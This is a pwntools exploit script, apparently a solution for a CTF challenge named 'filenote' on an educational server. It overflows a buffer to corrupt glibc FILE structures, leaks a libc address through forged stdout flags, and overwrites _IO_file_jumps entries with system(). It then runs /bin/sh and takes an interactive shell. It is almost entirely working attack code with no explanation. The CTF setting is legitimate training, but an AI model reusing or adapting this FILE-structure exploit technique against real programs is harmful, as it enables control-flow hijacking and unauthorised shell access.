from pwn import *

context.arch = 'amd64'
# context.binary = 'am64'
context.terminal = ['tmux', 'splitw', '-h']

if args['REMOTE']:
    p = remote('edu-ctf.zoolab.org', 30218 )
else:
    p = process('./filenote/chal')

l = ELF('./libc.so.6')


# p.recvuntil("0x")

# libc = int(p.recvline(), base = 16) - l.sym['stdout']
# 
# print(hex(libc))
# print(hex(_IO_file_jumps))

p.sendlineafter(">", "1")


flags = 0xfbad1800

payload = flat(
    flags, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    1
)

leak_payload = flat(
    flags, 0,
    0, 0,
)

p.sendlineafter(">", "2")
p.sendlineafter("data>", b"A" * 0x210 + payload)

p.sendlineafter(">" , "3")

p.sendlineafter(">" , "3")

p.sendlineafter(">" , "2")
p.sendlineafter("data>", b"b" * 0x10 + b"A" * 0x200 + leak_payload)
# gdb.attach(p)

p.sendlineafter(">" , "3")
p.sendlineafter(">" , "3")
p.sendlineafter(">" , "3")
p.sendlineafter(">" , "3")
p.sendlineafter(">" , "3")
p.sendlineafter(">" , "3")
p.sendlineafter(">" , "3")
leak = u64(p.recvuntil('A')[-17:-9])
libc = leak - 2019168
_IO_file_jumps = libc + l.sym['_IO_file_jumps']
one_gadget = libc + 0xe6c84
system = libc + l.sym['system']
_IO_2_1_stdout_ = libc + l.sym['_IO_2_1_stdout_']
binsh = libc + 0x1b75aa

print('leak: ' + hex(leak))
print('libc: ' + hex(libc))
print('_IO_file_jumps: ' + hex(_IO_file_jumps))
print('one_gadget: ' + hex(one_gadget))
print('system: ' + hex(system))

flag=0
flag&=~8
flag|=0x800
flag|=0x8000

stdout_payload = flat(
    b"/bin/sh", 0,
    0, 0,
    0, _IO_2_1_stdout_,
    _IO_2_1_stdout_ + 0x8, 0,
    0, 0,
    0, 0,
    0, 0,
    1
)

write_payload = flat(
    flag, 0,
    0, 0,
    0, _IO_file_jumps + 0x18,
    _IO_file_jumps + 0x20, 0,
    0, 0,
    0, 0,
    0, 0,
    1
)

# p.sendlineafter(">" , "3")



# gdb.attach(p)
# p.sendlineafter(">" , "3")
# p.sendlineafter(">" , "2")
# p.sendlineafter("data>", b"A" * 0x210 + payload)


p.sendline("2")
p.sendline(b"A" * 0x210 + write_payload)

p.sendlineafter(">" , "2")
p.sendlineafter("data>", p64(system))


# p.sendlineafter(">" , "2")
# p.sendlineafter("data>", p64(system))

p.sendlineafter(">" , "3")


p.sendline("2")
p.sendline(b"A" * 0x210 + stdout_payload)


# p.sendline("3")

# gdb.attach(p)








p.sendline("2")
p.sendline(b"/bin/sh")


p.sendline("3")


p.interactive()